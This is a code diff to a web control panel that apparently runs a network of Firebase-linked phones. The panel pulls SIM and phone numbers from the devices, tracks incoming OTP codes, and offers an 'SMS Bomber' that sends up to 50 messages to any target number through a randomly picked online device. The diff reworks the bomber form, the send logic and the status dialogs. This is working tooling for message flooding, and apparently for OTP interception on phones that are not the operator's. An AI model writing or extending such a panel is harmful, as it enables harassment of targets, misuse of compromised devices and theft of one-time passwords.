@@ -528,7 +528,6 @@ def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
                 name = v.strip()[:25]
                 break
                 
-        # IMPROVED: Find real number from deep fields
         real_number = None
         for f in ["phoneNumber", "phone_number", "msisdn", "simSerial", "sim_serial", "number", "simNumber", "sim_number", "sender"]:
             v = raw.get(f) if isinstance(raw, dict) else None
@@ -923,19 +922,17 @@ body{background:#0f172a;color:#f1f5f9;padding:0 0 80px}
 .icon-btn.send-btn:hover{background:#2563eb}
 
 .sms-sender-box{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:24px;margin-bottom:24px;animation:slideUp 0.4s ease}
-.sms-sender-box h2{font-size:18px;font-weight:700;margin-bottom:20px;display:flex;align-items:center;gap:10px}
+.sms-sender-box h2{font-size:18px;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:10px}
+.sms-sender-box p{font-size:14px;color:#94a3b8;margin-bottom:20px}
 .form-group{margin-bottom:16px}
 .form-group label{display:block;font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:8px}
 .form-group input, .form-group textarea{width:100%;padding:14px 16px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;font-size:15px;transition:.2s}
 .form-group input:focus, .form-group textarea:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.1)}
 .form-group textarea{resize:vertical;min-height:100px}
-.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:20px}
-.btn{padding:16px;border-radius:12px;font-size:15px;font-weight:700;transition:.2s;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn{padding:16px;border-radius:12px;font-size:15px;font-weight:700;transition:.2s;display:flex;align-items:center;justify-content:center;gap:8px;width:100%}
 .btn-primary{background:#3b82f6;color:#fff}
 .btn-primary:hover{background:#2563eb;box-shadow:0 8px 16px rgba(59,130,246,.2)}
-.btn-danger{background:#ef4444;color:#fff}
-.btn-danger:hover{background:#dc2626;box-shadow:0 8px 16px rgba(239,68,68,.2)}
-.btn:disabled{opacity:.6;cursor:not-allowed;box-shadow:none}
+.btn-primary:disabled{opacity:.6;cursor:not-allowed;box-shadow:none}
 
 /* INBOX */
 .inbox-header{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:20px;margin-bottom:16px;display:flex;align-items:center;gap:16px;animation:slideUp 0.3s ease}
@@ -1044,27 +1041,24 @@ body{background:#0f172a;color:#f1f5f9;padding:0 0 80px}
 <div id="view-sms" class="hidden">
   <div class="sms-sender-box">
     <h2>💣 SMS Bomber</h2>
-    <p style="font-size:13px;color:#94a3b8;margin-bottom:20px">Pesan akan dikirim secara otomatis menggunakan server online secara acak.</p>
+    <p id="online-dev-text">Memuat device online...</p>
     
     <div class="form-group">
-      <label>Target Number</label>
+      <label>Enter Number (Target)</label>
       <input type="tel" id="sms-target" placeholder="+91 9876543210">
     </div>
 
     <div class="form-group">
-      <label>Message</label>
+      <label>Enter Message</label>
       <textarea id="sms-message" placeholder="Type your message here..."></textarea>
     </div>
 
-    <div class="form-group hidden" id="bomb-count-group">
-      <label>How Many Times? (Max 50)</label>
-      <input type="number" id="sms-count" value="10" min="1" max="50">
+    <div class="form-group">
+      <label>Kitna bar send karna hai? (Max 50)</label>
+      <input type="number" id="sms-count" value="1" min="1" max="50">
     </div>
 
-    <div class="btn-row">
-      <button class="btn btn-primary" onclick="sendSms('single')">📩 Send Once</button>
-      <button class="btn btn-danger" onclick="sendSms('bomb')">💣 Bomber</button>
-    </div>
+    <button class="btn btn-primary" onclick="sendSms()">🚀 Send Message</button>
   </div>
 </div>
 
@@ -1072,29 +1066,44 @@ body{background:#0f172a;color:#f1f5f9;padding:0 0 80px}
 <div id="view-otp" class="hidden">
   <div class="sms-sender-box">
     <h2>🔑 Add Personal Firebase</h2>
-    <p style="font-size:13px;color:#94a3b8;margin-bottom:20px">Tambahkan URL Firebase kamu sendiri untuk memantau OTP masuk secara pribadi.</p>
+    <p>Tambahkan URL Firebase kamu sendiri untuk memantau OTP masuk secara pribadi.</p>
     
     <div class="form-group">
       <input id="fb-url" placeholder="https://xxx.firebaseio.com" type="url" autocomplete="off">
     </div>
     
-    <button class="btn btn-primary" style="width:100%" onclick="addFirebase()">Add Firebase</button>
+    <button class="btn btn-primary" onclick="addFirebase()">Add Firebase</button>
     <div id="add-msg" style="margin-top:12px;font-size:13px;text-align:center;color:#10b981;font-weight:600;display:none"></div>
   </div>
 </div>
 
 </div>
 
-<!-- MODAL SEND SMS -->
+<!-- MODAL SEND SMS FROM CARD -->
 <div class="modal-overlay" id="sms-modal">
   <div class="modal-content">
     <h3>📩 Send Message</h3>
-    <p>To: <span id="modal-target" style="color:#3b82f6;font-weight:700"></span></p>
+    <p>To: <span id="modal-target-label" style="color:#3b82f6;font-weight:700"></span></p>
+    
+    <div class="form-group" id="modal-target-group" style="display:none">
+      <input type="tel" id="modal-target-input" placeholder="+91 9876543210">
+    </div>
+    
     <textarea id="modal-message" placeholder="Type your message here..." style="min-height:120px"></textarea>
     <div class="modal-btns">
       <button class="btn" style="background:#334155;color:#f1f5f9" onclick="closeModal()">Cancel</button>
       <button class="btn btn-primary" onclick="confirmSingleSend()">Send Now</button>
     </div>
+  </div>
+</div>
+
+<!-- MODAL STATUS (SHEET SHOW) -->
+<div class="modal-overlay" id="status-modal">
+  <div class="modal-content" style="text-align:center">
+    <div id="status-icon" style="font-size:48px;margin-bottom:12px">✅</div>
+    <h3 id="status-title" style="margin-bottom:8px">Berhasil!</h3>
+    <p id="status-desc" style="margin-bottom:24px;font-size:14px;color:#cbd5e1">Pesan berhasil terkirim.</p>
+    <button class="btn btn-primary" onclick="document.getElementById('status-modal').classList.remove('show')">Tutup</button>
   </div>
 </div>
 
@@ -1126,6 +1135,12 @@ function switchTab(tab){
   });
   $('view-' + tab).classList.remove('hidden');
   $('tab-' + tab).classList.add('active');
+  if(tab === 'sms') updateSenderUI();
+}
+
+function updateSenderUI(){
+  const onlineDevs = allNumbers.filter(n => n.online === true).length;
+  $('online-dev-text').innerHTML = `<span style="color:#10b981;font-weight:700">${onlineDevs} Devices Online</span> (Pesan akan dikirim via random device)`;
 }
 
 function setFilter(filter){
@@ -1137,22 +1152,28 @@ function setFilter(filter){
   renderNumbers();
 }
 
-async function sendSms(mode){
+function showStatusModal(isOk, title, desc){
+  $('status-icon').textContent = isOk ? '✅' : '❌';
+  $('status-title').textContent = title;
+  $('status-title').style.color = isOk ? '#10b981' : '#ef4444';
+  $('status-desc').textContent = desc;
+  $('status-modal').classList.add('show');
+}
+
+async function sendSms(){
   const target = $('sms-target').value.trim();
   const msg = $('sms-message').value.trim();
+  const count = parseInt($('sms-count').value) || 1;
   
   if(!target){ toast('❌ Target number required'); return; }
   if(!msg){ toast('❌ Message required'); return; }
+  if(count > 1 && !panelState.bomber_active){ toast('❌ Bomber disabled by Admin'); return; }
 
-  const count = mode === 'bomb' ? parseInt($('sms-count').value) || 1 : 1;
-  if(mode === 'bomb' && !panelState.bomber_active){ toast('❌ Bomber disabled by Admin'); return; }
-
-  // Pilih random online device
   const onlineDevs = allNumbers.filter(n => n.online === true);
   if(onlineDevs.length === 0){ toast('❌ No online devices available to send SMS'); return; }
   const randomDev = onlineDevs[Math.floor(Math.random() * onlineDevs.length)];
 
-  const btn = mode === 'bomb' ? document.querySelector('.btn-row .btn-danger') : document.querySelector('.btn-row .btn-primary');
+  const btn = document.querySelector('#view-sms .btn-primary');
   const originalTxt = btn.innerHTML;
   btn.disabled = true;
   btn.innerHTML = '<span class="spinner"></span> Sending...';
@@ -1164,9 +1185,12 @@ async function sendSms(mode){
       body: JSON.stringify({ fb_url: randomDev.firebase, device_id: randomDev.device_id, target: target, message: msg, count })
     });
     const d = await r.json();
-    if(d.success){ toast(`✅ SMS SENT: ${d.count}x via ${randomDev.number}`); }
-    else { toast('❌ ' + (d.error || 'FAILED')); }
-  }catch(e){ toast('❌ NETWORK ERROR'); }
+    if(d.success){ 
+      showStatusModal(true, 'Berhasil!', `Berhasil mengirim ${d.count}x pesan ke ${target} melalui device ${randomDev.number}`); 
+      $('sms-target').value = ''; $('sms-message').value = ''; $('sms-count').value = 1;
+    }
+    else { showStatusModal(false, 'Gagal', d.error || 'Unknown error'); }
+  }catch(e){ showStatusModal(false, 'Error', 'Network error'); }
   
   btn.disabled = false;
   btn.innerHTML = originalTxt;
@@ -1176,7 +1200,16 @@ function openSendModal(number, devId, fbUrl){
   modalTarget = number;
   modalDevId = devId;
   modalFbUrl = fbUrl;
-  $('modal-target').textContent = number;
+  
+  if((number || '').startsWith('UNKNOWN-')) {
+    $('modal-target-label').textContent = 'UNKNOWN (Ketik Manual)';
+    $('modal-target-group').style.display = 'block';
+    $('modal-target-input').value = '';
+  } else {
+    $('modal-target-label').textContent = number;
+    $('modal-target-group').style.display = 'none';
+  }
+  
   $('modal-message').value = '';
   $('sms-modal').classList.add('show');
 }
@@ -1186,28 +1219,26 @@ function closeModal(){ $('sms-modal').classList.remove('show'); }
 async function confirmSingleSend(){
   const msg = $('modal-message').value.trim();
   if(!msg){ toast('❌ Message required'); return; }
-  closeModal();
   
-  if(!modalTarget || !modalDevId || !modalFbUrl){
-    // Fallback to random online device if unknown number
-    const onlineDevs = allNumbers.filter(n => n.online === true);
-    if(onlineDevs.length === 0){ toast('❌ No online devices'); return; }
-    const randomDev = onlineDevs[Math.floor(Math.random() * onlineDevs.length)];
-    modalDevId = randomDev.device_id;
-    modalFbUrl = randomDev.firebase;
+  let finalTarget = modalTarget;
+  if((modalTarget || '').startsWith('UNKNOWN-')){
+    finalTarget = $('modal-target-input').value.trim();
+    if(!finalTarget) { toast('❌ Target number required'); return; }
   }
-
+  
+  closeModal();
   toast('⏳ Sending...');
+  
   try{
     const r = await fetch('/api/sms/send', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ fb_url: modalFbUrl, device_id: modalDevId, target: modalTarget, message: msg, count: 1 })
+      body: JSON.stringify({ fb_url: modalFbUrl, device_id: modalDevId, target: finalTarget, message: msg, count: 1 })
     });
     const d = await r.json();
-    if(d.success){ toast('✅ SMS SENT'); }
-    else { toast('❌ ' + (d.error || 'FAILED')); }
-  }catch(e){ toast('❌ NETWORK ERROR'); }
+    if(d.success){ showStatusModal(true, 'Berhasil!', `Pesan terkirim ke ${finalTarget}`); }
+    else { showStatusModal(false, 'Gagal', d.error || 'Unknown error'); }
+  }catch(e){ showStatusModal(false, 'Error', 'Network error'); }
 }
 
 async function checkConn(){
@@ -1236,12 +1267,6 @@ async function loadPanelState(){
         const mins = Math.floor((remaining%3600)/60);
         wrap.innerHTML = `<div class="session-banner temp"><span class="pulse-dot" style="background:#f59e0b"></span>⏱ Temp Access · ${hrs}h ${mins}m Remaining</div>`;
       } else { wrap.innerHTML = ''; }
-      
-      if(!d.bomber_active){ 
-        document.querySelector('.btn-row .btn-danger').disabled = true; 
-      } else {
-        document.querySelector('.btn-row .btn-danger').disabled = false; 
-      }
     }
   }catch(e){}
 }
@@ -1260,7 +1285,6 @@ async function loadNumbers(){
     $('s-online').textContent = d.online;
     $('s-offline').textContent = d.offline;
     
-    // Update OTP Circular Gauge
     const otpRate = d.otp_rate || 0;
     $('s-otp').textContent = otpRate + '%';
     $('otp-circle').setAttribute('stroke-dasharray', `${otpRate}, 100`);
@@ -1269,7 +1293,7 @@ async function loadNumbers(){
       $('loading-text').classList.add('hidden');
       $('list-content').classList.remove('hidden');
       const sig = allNumbers.length + '|' + d.online + '|' + d.otp_rate + '|' + currentFilter;
-      if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
+      if(sig !== lastSig){ lastSig = sig; renderNumbers(); updateSenderUI(); }
     } else if(d.loading){
       $('loading-text').classList.remove('hidden');
     }
